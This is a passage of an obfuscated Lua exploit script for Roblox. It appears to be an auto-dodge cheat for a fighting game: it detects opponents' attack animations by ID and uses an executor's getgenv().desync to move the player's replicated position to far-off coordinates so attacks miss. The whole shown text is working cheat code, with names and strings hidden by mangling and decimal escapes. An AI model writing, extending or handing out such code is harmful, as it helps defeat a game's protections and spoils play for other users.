 ) repeat task.wait() until tick() >= _lIIIllllII + 5.5 local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x64 or _IIIIlIIlIl(_lIlIIlIIll) or tick() >= _lIlllIllIl + 0x1 or not _IlIlIlIlIl.IsPlaying end
 ) end
 if _IIIIIIIlII:match("\049\053\054\055\054\048\055\050\052\054\057") and rawget(_lIIlIllIlI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\083\111\108\097\114\032\067\108\101\097\118\101") then local _lIIlIIlllI, isTouched, cleanup = _IIIIIIIIII(Vector3.new(0x32,0xA,0x96)) local _lIIIllllII = tick() repeat _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0,0x0,-0x4B) if isTouched() and not _IIIIlIIlIl(_lIlIIlIIll) then getgenv().desync = { CFrame = _IIllIIIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0x2 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IIIIIIIlII:match("\049\054\048\053\055\052\049\049\056\056\056") and rawget(_lIIlIllIlI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114") then task.wait(4.25) local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or tick() >= _lIIIllllII + 0x2 end
 ) end
 if _IIIIIIIlII:match("\049\056\052\051\053\053\051\053\050\057\049") and rawget(_lIIlIllIlI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\083\117\105\114\121\117\032\085\108\116") then task.wait(4.25) local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x64 or tick() >= _lIIIllllII + 1.25 end
 ) end
 if _IIIIIIIlII:match("\049\055\056\053\055\055\056\056\053\057\056") and rawget(_lIIlIllIlI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\068\114\111\112") then task.wait(0.65) if _IlIlIlIlIl.IsPlaying then local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(0x23, 0x800, 0x23) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat _IllllllIIl.CFrame = _lllIIIIlIl.CFrame if _IIlIIIlIII and not _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0.85 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 end
 if _IIIIIIIlII:match("\049\050\057\054\053\049\052\048\048\056\057\056\057\048\054") and rawget(_lIIlIllIlI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\071\114\097\110\100\032\070\105\115\115\117\114\101") then task.wait(0.5) local _IllIIlIlll = _lllIIIIlIl.CFrame local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x4B or tick() >= _lIIIllllII + 1.25 or not _IlIlIlIlIl.IsPlaying end
 ) task.wait(0x1) local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _IllIIlIlll.Position).Magnitude > 0x4B or tick() >= _lIlllIllIl + 1.75 end
 ) end
 if _IIIIIIIlII:match("\049\056\056\057\054\050\050\057\051\050\049") and rawget(_lIIlIllIlI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\084\119\105\110\032\070\097\110\103\115") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0xF or _lIlIIlllIl(_llIIIIIIlI) or tick() >= _lIIIllllII + 3.5 or not _IlIlIlIlIl.IsPlaying end
 ) task.wait(0x1) if _IlIlIlIlIl.IsPlaying then if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x19 then local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x19 or tick() >= _lIlllIllIl + 0x2 or not _IlIlIlIlIl.IsPlaying end
 ) end
 end
 end
 if _IIIIIIIlII:match("\049\056\056\057\055\049\049\057\053\048\051") and rawget(_lIIlIllIlI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or tick() >= _lIIIllllII + 1.5 end
 ) end
 if _IIIIIIIlII:match("\049\048\054\055\053\053\052\053\057\048\057\050\052\051\054") or _IIIIIIIlII:match("\055\053\053\048\050\048\049\048\049\050\054\054\052\048") then MoveNotify(_IlIlIIIlII, "\076\097\115\116\032\066\114\101\097\116\104") end
 if (_IIIIIIIlII:match("\049\048\054\055\053\053\052\053\057\048\057\050\052\051\054") or _IIIIIIIlII:match("\055\053\053\048\050\048\049\048\049\050\054\054\052\048")) and rawget(_lIIlIllIlI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\076\097\115\116\032\066\114\101\097\116\104") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or tick() >= _lIIIllllII + 0x2 end
 ) end
 if _IIIIIIIlII:match("\049\054\053\049\053\056\053\048\049\053\051") and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121") then task.spawn( function () if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0xF then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } end
 local _IIlIIIllll = workspace.Thrown:WaitForChild("\068\111\116\116\101\100", 0x1) if _IIlIIIllll then local _IIIlllIlIl = _IIlIIIllll:WaitForChild("\068\111\116\115", 0x1) if not _IIIlllIlIl then getgenv().desync = nil return end
 local _lIIIllllII = tick() if (_IllllIllII() - _IIIlllIlIl.Position).Magnitude > 0x14 then getgenv().desync = nil end
 _IIIIlIlIII( function () return (_IllllIllII() - _IIIlllIlIl.Position).Magnitude > 0x14 or _IIIIlIIlIl(_lIlIIlIIll) or tick() >= _lIIIllllII + 4.25 end
 ) else getgenv().desync = nil end
 end
 ) end
 if _IIIIIIIlII:match("\049\054\052\051\049\052\057\049\050\049\053") and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then local _lIIIllllII = tick() repeat task.wait() until (_IllllIllII() - (_lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -0x19)).Position).Magnitude <= 0x19 or _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") or tick() >= _lIIIllllII + 0.75 if not _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then _IIIIlIlIII( function () return (_IllllIllII() - (_lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -0x14)).Position).Magnitude > 0x19 or _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") or tick() >= _lIIIllllII + 0.75 end
 ) end
 end
 if _IIIIIIIlII:match("\049\054\053\057\055\057\049\050\048\056\054") and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0xF or _lIlIIlllIl(_llIIIIIIlI) or tick() >= _lIIIllllII + 0.75 end
 ) end
 if _IIIIIIIlII:match("\049\055\050\055\053\049\053\048\056\048\057") and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or tick() >= _lIIIllllII + 0x1 end
 ) end
 if _IIIIIIIlII:match("\049\055\050\055\056\052\049\053\056\053\051") and _IIllIIlllI:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\069\115\112\101\114" and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111") then task.wait(0xB) local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x64 or tick() >= _lIIIllllII + 0x6 end
 ) end
 if _IIIIIIIlII:match("\049\054\055\051\052\053\056\052\052\055\056") and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\084\097\116\115\117\109\097\107\105\032\085\108\116") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x4B or tick() >= _lIIIllllII + 5.75 end
 ) end
 if _IIIIIIIlII:match("\049\051\051\055\054\056\054\057\052\055\049") and rawget(_lIIlIllIlI.AntiMoves_Sonic.Value, "\065\110\116\105\032\070\108\097\115\104\032\083\116\114\105\107\101") then local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(0xA, 7.5, 0x3C) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat _IllllllIIl.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -_IllllllIIl.Size.Z / 0x2) RunService.RenderStepped:Wait() until _IIlIIIlIII or tick() >= _lIIIllllII + 0x3 or not _IlIlIlIlIl.IsPlaying if _IIlIIIlIII then local _lIlllIllIl = tick() _IIIIlIlIII( function () return not _IIlIIIlIII or tick() >= _lIlllIllIl + 0x1 or not _IlIlIlIlIl.IsPlaying end
 ) end
 _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 if _IIIIIIIlII:match("\049\051\050\057\052\055\057\048\050\053\048") and rawget(_lIIlIllIlI.AntiMoves_Sonic.Value, "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\075\105\099\107") then task.wait(0.5) local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - (_lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -2.5)).Position).Magnitude > 0xA or _lIlIIlllIl(_llIIIIIIlI) or tick() >= _lIIIllllII + 0.75 end
 ) end
 if _IIIIIIIlII:match("\049\051\054\051\050\051\052\055\051\054\054") and rawget(_lIIlIllIlI.AntiMoves_Sonic.Value, "\065\110\116\105\032\084\119\105\110\098\108\097\100\101\032\082\117\115\104") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x4B or _IIIIlIIlIl(_lIlIIlIIll) or tick() >= _lIIIllllII + 1.75 or not _IlIlIlIlIl.IsPlaying end
 ) end
 if _IIIIIIIlII:match("\049\051\055\050\051\049\055\052\048\055\056") and rawget(_lIIlIllIlI.AntiMoves_Sonic.Value, "\065\110\116\105\032\067\097\114\110\097\103\101") then task.wait(0.5) local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x32 or tick() >= _lIIIllllII + 0x2 or not _IlIlIlIlIl.IsPlaying end
 ) end
 if _IIIIIIIlII:match("\049\051\056\056\049\051\051\053\055\049\051") and rawget(_lIIlIllIlI.AntiMoves_Sonic.Value, "\065\110\116\105\032\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101") then task.wait(0.75) if _IlIlIlIlIl.IsPlaying then local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(0x23, 0x5, 0x3C) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat _IllllllIIl.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -_IllllllIIl.Size.Z / 0x2) RunService.RenderStepped:Wait() until _IIlIIIlIII or tick() >= _lIIIllllII + 0x3 or not _IlIlIlIlIl.IsPlaying if _IIlIIIlIII then local _lIlllIllIl = tick() _IIIIlIlIII( function () return not _IIlIIIlIII or tick() >= _lIlllIllIl + 0x1 or not _IlIlIlIlIl.IsPlaying end
 ) end
 _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 end
 if _IIIIIIIlII:match("\049\052\055\050\049\056\051\055\050\052\053") and rawget(_lIIlIllIlI.AntiMoves_Genos.Value, "\065\110\116\105\032\084\104\117\110\100\101\114\032\075\105\099\107") then local _lIIIllllII = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x19 or _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") or tick() >= _lIIIllllII + 1.5 or not _IlIlIlIlIl.IsPlaying end
 ) if tick() >= _lIIIllllII + 1.5 then task.wait(0x1) local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x64 or tick() >= _lIlllIllIl + 1.5 or not _IlIlIlIlIl.IsPlaying end
 ) end
 end
 if _IIIIIIIlII:match("\049\051\048\056\051\051\051\050\055\052\050") and rawget(_lIIlIllIlI.AntiMoves_Genos.Value, "\065\110\116\105\032\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110") then task.wait(0x1) local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(12.5, 0x5, 0x3E8) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 task.delay(0.25, function () _IllllllIIl.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -_IllllllIIl.Size.Z / 0x2) end
 ) local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat if _IIlIIIlIII and not _IIIIlIIlIl(_lIlIIlIIll) then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0x4 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 if _IIIIIIIlII:match("\049\051\049\052\054\055\049\048\055\054\050") and rawget(_lIIlIllIlI.AntiMoves_Genos.Value, "\065\110\116\105\032\073\110\099\105\110\101\114\097\116\101") then task.wait(3.25) if _IlIlIlIlIl.IsPlaying then local _IllIllllIl = {} local _IIIlIllIlI = { CFrame.new(0x32, 0x0, -0xC8) * CFrame.Angles(0x0, math.rad(-0xF), 0x0), CFrame.new(-0x32, 0x0, -0xC8) * CFrame.Angles(0x0, math.rad(0xF), 0x0), CFrame.new(0x0, 0x0, -0xC8), } local _IIlIIIlIII = false local _lIIIlIIlII = {} for _lIIlIllIlI, off in ipairs(_IIIlIllIlI) do local _lIIlIIlllI = Instance.new("\080\097\114\116", workspace) _lIIlIIlllI.Anchored = true _lIIlIIlllI.Size = Vector3.new(0x64, 0x4B, 0x190) _lIIlIIlllI.CanCollide = false _lIIlIIlllI.Transparency = 0x1 _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * off table.insert(_IllIllllIl, _lIIlIIlllI) table.insert(_lIIIlIIlII, _lIIlIIlllI.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 )) table.insert(_lIIIlIIlII, _lIIlIIlllI.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 )) end
 local _lIIIllllII = tick() repeat if _IIlIIIlIII and not _IIIIlIIlIl(_lIlIIlIIll) then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 0x6 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil for _lIIlIllIlI, _IlIlIllIll in ipairs(_lIIIlIIlII) do _IlIlIllIll:Disconnect() end
 for _lIIlIllIlI, _lIIlIIlllI in ipairs(_IllIllllIl) do pcall( function () _lIIlIIlllI:Destroy() end
 ) end
 end
 end
 if _IIIIIIIlII:match("\049\055\049\052\049\049\053\051\048\057\057") and rawget(_lIIlIllIlI.AntiMoves_KJ.Value, "\065\110\116\105\032\083\116\111\105\099\032\066\111\109\098") then task.delay(0x2, function () local _lIIIllllII = tick() repeat task.wait() until (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x4B or tick() >= _lIIIllllII + 1.5 if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x4B then local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x4B or tick() >= _lIlllIllIl + 1.5 end
 ) end
 end
 ) end
 if _IIIIIIIlII:match("\049\055\051\053\052\057\055\054\048\054\055") and rawget(_lIIlIllIlI.AntiMoves_KJ.Value, "\065\110\116\105\032\050\048\045\050\048\045\050\048\032\068\114\111\112\107\105\099\107") then task.delay(0x1, function () local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(0x19, 0x5, 0x7D) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat _IllllllIIl.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -_IllllllIIl.Size.Z / 0x2) RunService.RenderStepped:Wait() until _IIlIIIlIII or tick() >= _lIIIllllII + 0x5 or not _IlIlIlIlIl.IsPlaying if _IIlIIIlIII then local _lIlllIllIl = tick() _IIIIlIlIII( function () return not _IIlIIIlIII or tick() >= _lIlllIllIl + 1.5 or not _IlIlIlIlIl.IsPlaying end
 ) end
 _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 ) end
 if _IIIIIIIlII:match("\049\056\052\054\050\056\057\052\053\057\051") and rawget(_lIIlIllIlI.AntiMoves_KJ.Value, "\065\110\116\105\032\070\105\118\101\032\083\101\097\115\111\110\115") then task.delay(6.75, function () local _lIIIllllII = tick() _IIIIlIlIII( function () return tick() >= _lIIIllllII + 0x1 end
 ) end
 ) end
 if _IIIIIIIlII:match("\049\048\048\053\053\056\053\056\057\051\048\055\048\048\054") and rawget(_lIIlIllIlI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\080\101\114\109\097\102\114\111\115\116") then task.wait(0.35) if _IlIlIlIlIl.IsPlaying then local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(0x2D, 0x19, 0x55) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat _IllllllIIl.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -_IllllllIIl.Size.Z / 0x2) if _IIlIIIlIII and not _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 task.wait() until tick() >= _lIIIllllII + 0.65 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 end
 if _IIIIIIIlII:match("\049\051\055\053\054\049\053\049\049\055\054\056\056\054\049") and rawget(_lIIlIllIlI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\070\114\111\115\116\032\070\111\114\103\101") then task.delay(0x1, function () local _lIIIllllII = tick() repeat task.wait() until (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x96 or tick() >= _lIIIllllII + 0.75 if (_IllllIllII() - _lllIIIIlIl.Position).Magnitude <= 0x96 then local _lIlllIllIl = tick() _IIIIlIlIII( function () return (_IllllIllII() - _lllIIIIlIl.Position).Magnitude > 0x96 or tick() >= _lIlllIllIl + 0.75 end
 ) end
 end
 ) end
 if _IIIIIIIlII:match("\049\049\050\054\050\048\051\054\053\050\052\048\050\051\053") and rawget(_lIIlIllIlI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\070\114\101\101\122\105\110\103\032\080\097\116\104") then task.wait(0.5) if _IlIlIlIlIl.IsPlaying then local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(0x14, 0xA, 0x23) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat _IllllllIIl.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -_IllllllIIl.Size.Z / 0x2) if _IIlIIIlIII and not _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 task.wait() until tick() >= _lIIIllllII + 0x4 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 end
 if _IIIIIIIlII:match("\055\053\053\052\055\053\057\048\051\051\053\055\055\052") and rawget(_lIIlIllIlI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110") then task.wait(0.35) if _IlIlIlIlIl.IsPlaying then local _IllllllIIl = Instance.new("\080\097\114\116", workspace) _IllllllIIl.Anchored = true _IllllllIIl.Size = Vector3.new(0xA, 0x5, 0xAF) _IllllllIIl.CanCollide = false _IllllllIIl.Transparency = 0x1 local _IIlIIIlIII = false local _lllllllIll = _IllllllIIl.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = true end
 end
 ) local _lIlllllIll = _IllllllIIl.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII = false end
 end
 ) local _lIIIllllII = tick() repeat _IllllllIIl.CFrame = _lllIIIIlIl.CFrame * CFrame.new(0x0, 0x0, -_IllllllIIl.Size.Z / 0x2) if _IIlIIIlIII and not _IllllIlIlI(_llIIIIIIlI, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 task.wait() until tick() >= _lIIIllllII + 0x1 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil _lllllllIll:Disconnect() _lIlllllIll:Disconnect() pcall( function () _IllllllIIl:Destroy() end
 ) end
 end
 if _IIIIIIIlII:match("\049\049\051\052\051\051\049\056\049\051\052") and rawget(_lIIlIllIlI.AntiMoves_Saitama.Value, "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\083\104\111\099\107\119\097\118\101") then task.wait(7.5) if not _IlIlIlIlIl.IsPlaying then return end
 local _IllIllllIl = {} local _IIIlIllIlI = { CFrame.new(0x3C, 0x0, -0xFA) * CFrame.Angles(0x0, math.rad(-0xF), 0x0), CFrame.new(-0x3C, 0x0, -0xFA) * CFrame.Angles(0x0, math.rad(0xF), 0x0), CFrame.new(0x0, 0x0, -0xFA), } local _IIlIIIlIII = {false, false, false} local _lIIIlIIlII = {} for _IIIllIIIIl, off in ipairs(_IIIlIllIlI) do local _lIIlIIlllI = Instance.new("\080\097\114\116", workspace) _lIIlIIlllI.Anchored = true _lIIlIIlllI.Size = Vector3.new(0x7D, 0x5, 0x1F4) _lIIlIIlllI.CanCollide = false _lIIlIIlllI.Transparency = 0x1 table.insert(_IllIllllIl, _lIIlIIlllI) local _IIllIllIll = _IIIllIIIIl table.insert(_lIIIlIIlII, _lIIlIIlllI.Touched:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII[_IIllIllIll] = true end
 end
 )) table.insert(_lIIIlIIlII, _lIIlIIlllI.TouchEnded:Connect( function (_IllIllIIll) if _IllIllIIll == _llIllIIIII or _IllIllIIll == getgenv().InvisPart30 then _IIlIIIlIII[_IIllIllIll] = false end
 end
 )) end
 local _lIIIllllII = tick() repeat for _IIIllIIIIl, _lIIlIIlllI in ipairs(_IllIllllIl) do _lIIlIIlllI.CFrame = _lllIIIIlIl.CFrame * _IIIlIllIlI[_IIIllIIIIl] end
 if _IIlIIIlIII[0x1] or _IIlIIIlIII[0x2] or _IIlIIIlIII[0x3] then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _lIIIllllII + 2.5 or not _IlIlIlIlIl.IsPlaying getgenv().desync = nil for _lIIlIllIlI, _IlIlIllIll in ipairs(_lIIIlIIlII) do _IlIlIllIll:Disconnect() end
 for _lIIlIllIlI, _lIIlIIlllI in ipairs(_IllIllllIl) do pcall( function () _lIIlIIlllI:Destroy() end
 ) end
 end
 end
 ) end
 ) _IIIlIlIIIl[_IlIlIIIlII] = _IllIIlIllI end
 _lIlIIIIlIl = function (_IlIlIIIlII) if _IlIlIIIlII == _llIlIIlIll then return end
 if _IlIlIIIlII.Character then task.spawn(_lIIIllIIII, _IlIlIIIlII, _IlIlIIIlII.Character) end
 local _IlIlIllIll = _IlIlIIIlII.CharacterAdded:Connect( function (_IIllIIlllI) task.spawn(_lIIIllIIII, _IlIlIIIlII, _IIllIIlllI) end
 ) _lIllIlllll[_IlIlIIIlII] = _IlIlIllIll end
 for _lIIlIllIlI, _lIIlIIlllI in pairs(Players:GetPlayers()) do task.spawn(_lIlIIIIlIl, _lIIlIIlllI) end
 local _llllllIlll = Players.PlayerAdded:Connect( function (_lIIlIIlllI) if _lIIlIIlllI == _llIlIIlIll then return end
